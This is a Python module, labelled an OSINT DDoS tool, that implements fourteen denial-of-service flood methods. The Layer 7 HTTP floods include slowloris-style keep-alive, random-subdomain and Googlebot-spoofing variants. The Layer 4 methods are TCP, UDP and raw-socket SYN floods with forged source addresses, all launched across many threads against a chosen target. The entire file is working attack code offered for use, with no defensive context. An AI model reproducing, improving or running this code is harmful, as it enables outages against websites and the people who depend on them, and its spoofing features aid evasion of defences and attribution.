"""
0312-OSINT DDoS Module - Layer7 & Layer4 attack methods
"""
import requests
import socket
import random
import string
import struct
import threading
import time
import ssl
from urllib.parse import urlparse


class DDoSAttack:
    METHODS = [
        "GET", "POST", "HEAD", "NULL", "COOKIE", "PPS", "BYPASS",
        "SLOW", "DYN", "BOT", "STRESS", "TCP", "UDP", "SYN"
    ]

    def __init__(self, target):
        self.target = target
        self.parsed = urlparse(target)
        self.host = self.parsed.hostname or target
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.path = self.parsed.path or "/"
        self.is_ssl = self.parsed.scheme == "https"
        self.running = False
        self.threads = []
        self.sent = 0
        self.lock = threading.Lock()

    def _random_str(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def _random_ua(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        ]
        return random.choice(agents)

    def _make_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((self.host, self.port))
        if self.is_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _send_raw(self, sock, data):
        try:
            sock.send(data)
            with self.lock:
                self.sent += 1
        except:
            pass

    # Layer7 Methods
    def _get_flood(self):
        payload = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {self._random_ua()}\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode()
        while self.running:
            try:
                s = self._make_socket()
                for _ in range(10):
                    self._send_raw(s, payload)
                s.close()
            except:
                pass

    def _post_flood(self):
        body = f"data={self._random_str(64)}"
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {self._random_ua()}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"{body}"
        ).encode()
        while self.running:
            try:
                s = self._make_socket()
                self._send_raw(s, payload)
                s.close()
            except:
                pass

    def _head_flood(self):
        payload = (
            f"HEAD {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {self._random_ua()}\r\n"
            f"Accept: */*\r\n\r\n"
        ).encode()
        while self.running:
            try:
                s = self._make_socket()
                self._send_raw(s, payload)
                s.close()
            except:
                pass

    def _null_flood(self):
        payload = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: \r\n"
            f"Accept: */*\r\n\r\n"
        ).encode()
        while self.running:
            try:
                s = self._make_socket()
                self._send_raw(s, payload)
                s.close()
            except:
                pass

    def _cookie_flood(self):
        payload = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {self._random_ua()}\r\n"
            f"Cookie: {self._random_str(12)}={self._random_str(32)}\r\n"
            f"Accept: */*\r\n\r\n"
        ).encode()
        while self.running:
            try:
                s = self._make_socket()
                self._send_raw(s, payload)
                s.close()
            except:
                pass

    def _pps_flood(self):
        payload = f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode()
        while self.running:
            try:
                s = self._make_socket()
                self._send_raw(s, payload)
                s.close()
            except:
                pass

    def _bypass_flood(self):
        while self.running:
            try:
                s = requests.Session()
                s.get(f"{self.parsed.scheme or 'http'}://{self.host}{self.path}",
                      headers={"User-Agent": self._random_ua()}, timeout=5)
                s.close()
                with self.lock:
                    self.sent += 1
            except:
                pass

    def _slow_flood(self):
        try:
            s = self._make_socket()
            payload = (
                f"GET {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {self._random_ua()}\r\n"
                f"Accept: */*\r\n"
            ).encode()
            s.send(payload)
            while self.running:
                s.send(b"X-Pending: keep\r\n")
                time.sleep(10)
            s.close()
        except:
            pass

    def _dyn_flood(self):
        while self.running:
            try:
                s = self._make_socket()
                sub = self._random_str(6)
                payload = (
                    f"GET {self.path} HTTP/1.1\r\n"
                    f"Host: {sub}.{self.host}\r\n"
                    f"User-Agent: {self._random_ua()}\r\n"
                    f"Accept: */*\r\n\r\n"
                ).encode()
                self._send_raw(s, payload)
                s.close()
            except:
                pass

    def _bot_flood(self):
        bot_agents = [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
        ]
        while self.running:
            try:
                ua = random.choice(bot_agents)
                s = requests.Session()
                s.get(f"{self.parsed.scheme or 'http'}://{self.host}/robots.txt",
                      headers={"User-Agent": ua}, timeout=5)
                s.get(f"{self.parsed.scheme or 'http'}://{self.host}{self.path}",
                      headers={"User-Agent": ua, "From": "googlebot(at)googlebot.com"}, timeout=5)
                s.close()
                with self.lock:
                    self.sent += 2
            except:
                pass

    def _stress_flood(self):
        body = f"data={self._random_str(512)}"
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {self._random_ua()}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"{body}"
        ).encode()
        while self.running:
            try:
                s = self._make_socket()
                self._send_raw(s, payload)
                s.close()
            except:
                pass

    # Layer4 Methods
    def _tcp_flood(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, self.port))
                s.send(random._urandom(1024))
                s.close()
                with self.lock:
                    self.sent += 1
            except:
                pass

    def _udp_flood(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (self.host, self.port))
                s.close()
                with self.lock:
                    self.sent += 1
            except:
                pass

    def _syn_flood(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sport = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                # Simple SYN packet
                packet = b''
                # IP header
                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 40
                ip_id = random.randint(0, 65535)
                ip_frag_off = 0
                ip_ttl = 255
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(".".join(str(random.randint(1, 254)) for _ in range(4)))
                ip_daddr = socket.inet_aton(self.host)
                ip_ihl_ver = (ip_ver << 4) + ip_ihl
                ip_header = struct.pack('!BBHHHBBH4s4s',
                                        ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                        ip_frag_off, ip_ttl, ip_proto, ip_check,
                                        ip_saddr, ip_daddr)
                # TCP header
                tcp_source = sport
                tcp_dest = self.port
                tcp_seq = seq
                tcp_ack_seq = 0
                tcp_doff = 5
                tcp_flags = 0x02  # SYN
                tcp_window = socket.htons(5840)
                tcp_check = 0
                tcp_urg_ptr = 0
                tcp_offset_res = (tcp_doff << 4) + 0
                tcp_header = struct.pack('!HHLLBBHHH',
                                         tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                                         tcp_offset_res, tcp_flags, tcp_window,
                                         tcp_check, tcp_urg_ptr)
                packet = ip_header + tcp_header
                s.sendto(packet, (self.host, 0))
                s.close()
                with self.lock:
                    self.sent += 1
            except:
                pass

    def start(self, method="GET", threads=50, duration=30):
        self.running = True
        method = method.upper()

        method_map = {
            "GET": self._get_flood,
            "POST": self._post_flood,
            "HEAD": self._head_flood,
            "NULL": self._null_flood,
            "COOKIE": self._cookie_flood,
            "PPS": self._pps_flood,
            "BYPASS": self._bypass_flood,
            "SLOW": self._slow_flood,
            "DYN": self._dyn_flood,
            "BOT": self._bot_flood,
            "STRESS": self._stress_flood,
            "TCP": self._tcp_flood,
            "UDP": self._udp_flood,
            "SYN": self._syn_flood,
        }

        func = method_map.get(method)
        if not func:
            return False, f"Unknown method: {method}. Available: {', '.join(self.METHODS)}"

        self.threads = []
        for i in range(threads):
            t = threading.Thread(target=func, daemon=True)
            t.start()
            self.threads.append(t)

        if duration > 0:
            time.sleep(duration)
            self.stop()

        return True, f"Attack started: {method} -> {self.host}:{self.port} [{threads} threads]"

    def stop(self):
        self.running = False
        return True

    def stats(self):
        return {"sent": self.sent, "running": self.running}


def run_ddos(target, method="GET", threads=50, duration=30):
    attack = DDoSAttack(target)
    success, msg = attack.start(method, threads, duration)
    return success, msg, attack.stats()
